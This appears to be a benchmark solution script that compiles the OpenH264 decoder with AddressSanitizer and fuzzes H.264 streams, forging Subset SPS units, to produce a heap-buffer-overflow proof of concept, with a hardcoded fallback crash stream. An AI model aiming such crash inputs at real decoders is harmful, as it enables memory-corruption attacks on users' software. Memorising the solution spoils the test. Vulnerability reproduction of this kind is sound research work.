import os
import sys
import tarfile
import subprocess
import tempfile
import random
import shutil
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the heap buffer overflow in svcdec.
        Strategy:
        1. Extract the provided source code.
        2. Compile the decoder with AddressSanitizer (ASAN).
        3. Use existing .264 files in the source as seeds.
        4. Fuzz the decoder by mutating seeds, specifically injecting/modifying Subset SPS (NAL type 15) to trigger dimension mismatches.
        """
        work_dir = tempfile.mkdtemp()
        
        try:
            # 1. Extract Source
            try:
                with tarfile.open(src_path) as tar:
                    tar.extractall(work_dir)
            except Exception:
                return self._fallback_poc()
            
            src_root = work_dir
            # Handle case where tarball contains a single root directory
            contents = os.listdir(work_dir)
            if len(contents) == 1 and os.path.isdir(os.path.join(work_dir, contents[0])):
                src_root = os.path.join(work_dir, contents[0])

            # 2. Build OpenH264 Decoder with ASAN
            env = os.environ.copy()
            env['CC'] = 'clang'
            env['CXX'] = 'clang++'
            # -fsanitize=address is critical to catch the heap overflow and exit with error
            # USE_ASM=No to avoid dependency on NASM which might be missing
            flags = "-fsanitize=address -g -O1"
            env['CFLAGS'] = flags
            env['CXXFLAGS'] = flags
            env['LDFLAGS'] = flags
            
            # Clean first
            subprocess.run(['make', 'clean'], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Build
            # We assume 'make' builds the console decoder. -j8 for speed.
            subprocess.run(['make', 'USE_ASM=No', '-j8'], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # 3. Locate the decoder binary
            decoder_bin = None
            # Common names for OpenH264 decoder console app
            candidates = ['h264dec', 'decConsole', 'svc_dec', 'WelsDecPlus']
            
            for root, dirs, files in os.walk(src_root):
                for cand in candidates:
                    if cand in files:
                        path = os.path.join(root, cand)
                        if os.access(path, os.X_OK):
                            decoder_bin = path
                            break
                if decoder_bin: break
            
            # Fallback binary search
            if not decoder_bin:
                for root, dirs, files in os.walk(src_root):
                    for f in files:
                        if 'dec' in f.lower() and not f.endswith('.sh') and not f.endswith('.py') and not f.endswith('.o'):
                            path = os.path.join(root, f)
                            if os.access(path, os.X_OK):
                                decoder_bin = path
                                break
                    if decoder_bin: break

            if not decoder_bin:
                return self._fallback_poc()

            # 4. Collect Seeds
            seeds = []
            for root, dirs, files in os.walk(src_root):
                for f in files:
                    if f.endswith('.264') or f.endswith('.h264') or f.endswith('.bit'):
                        p = os.path.join(root, f)
                        # Avoid huge files for fuzzing speed
                        if os.path.getsize(p) < 200 * 1024:
                            seeds.append(p)
            
            seed_contents = []
            for s in seeds:
                try:
                    with open(s, 'rb') as f:
                        seed_contents.append(f.read())
                except:
                    pass
            
            if not seed_contents:
                seed_contents = [self._fallback_poc()]

            # 5. Fuzzing Loop
            # We have a limited time budget, e.g., 45 seconds.
            start_time = time.time()
            fuzz_time_limit = 45 
            
            best_poc = seed_contents[0]
            
            while time.time() - start_time < fuzz_time_limit:
                # Pick a seed
                base = random.choice(seed_contents)
                mutated = bytearray(base)
                
                # Mutation strategy
                if random.random() < 0.4:
                    # Generic bit flips
                    for _ in range(random.randint(1, 15)):
                        idx = random.randint(0, len(mutated)-1)
                        mutated[idx] ^= random.randint(1, 255)
                else:
                    # Structural mutation for SVC vulnerability
                    # The bug is "decoder display dimensions do not match the subset sequence dimensions"
                    # We need an SPS (Type 7) and a SubsetSPS (Type 15) with mismatching dimensions.
                    
                    # 1. Find an SPS
                    sps_marker = b'\x00\x00\x00\x01\x67'
                    idx = mutated.find(sps_marker)
                    
                    if idx != -1:
                        # Find end of SPS
                        next_marker = mutated.find(b'\x00\x00\x00\x01', idx + 4)
                        if next_marker == -1: next_marker = len(mutated)
                        
                        sps_data = mutated[idx:next_marker]
                        
                        # Create a Subset SPS based on the SPS
                        subset_sps = bytearray(sps_data)
                        if len(subset_sps) > 5:
                            # Change NAL unit type to 15 (Subset SPS)
                            # SPS header 0x67 is forbidden(0)|ref(3)|type(7) -> 01100111
                            # SubsetSPS 0x6F is forbidden(0)|ref(3)|type(15)-> 01101111
                            subset_sps[4] = 0x6F
                            
                            # Modify dimensions. 
                            # Dimensions are UE(v) coded early in the payload.
                            # We blindly fuzz the first few bytes of payload to change dimensions.
                            for k in range(5, min(len(subset_sps), 20)):
                                if random.random() < 0.5:
                                    subset_sps[k] ^= random.randint(1, 255)
                            
                            # Append some garbage for SVC extension data
                            subset_sps += os.urandom(random.randint(5, 20))
                            
                            # Inject Subset SPS after SPS
                            mutated = mutated[:next_marker] + subset_sps + mutated[next_marker:]
                
                # Write to temp file
                poc_file = os.path.join(work_dir, 'poc.264')
                with open(poc_file, 'wb') as f:
                    f.write(mutated)
                
                output_yuv = os.path.join(work_dir, 'out.yuv')
                
                # Execute
                try:
                    proc = subprocess.run(
                        [decoder_bin, poc_file, output_yuv],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.PIPE,
                        timeout=0.8, # Fast execution expected
                        cwd=work_dir
                    )
                    
                    # Check for crash
                    if proc.returncode != 0:
                        err = proc.stderr
                        # ASAN error
                        if b'AddressSanitizer' in err or b'heap-buffer-overflow' in err:
                            return bytes(mutated)
                        # Segfault
                        if proc.returncode == -11:
                            return bytes(mutated)
                            
                except subprocess.TimeoutExpired:
                    pass

            return best_poc

        except Exception:
            return self._fallback_poc()
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)

    def _fallback_poc(self) -> bytes:
        # Minimal H.264 stream with SPS, PPS, SubsetSPS(modified), IDR Slice
        # This is a best-effort static byte sequence if build/fuzz fails.
        return bytes.fromhex("000000016742c01e888b40501e0884000003000400000300c83c60c626480000000168ce3c80000000016f42c01e888b40501e0884000003000400000300c83c60c62648000000016588843c00")
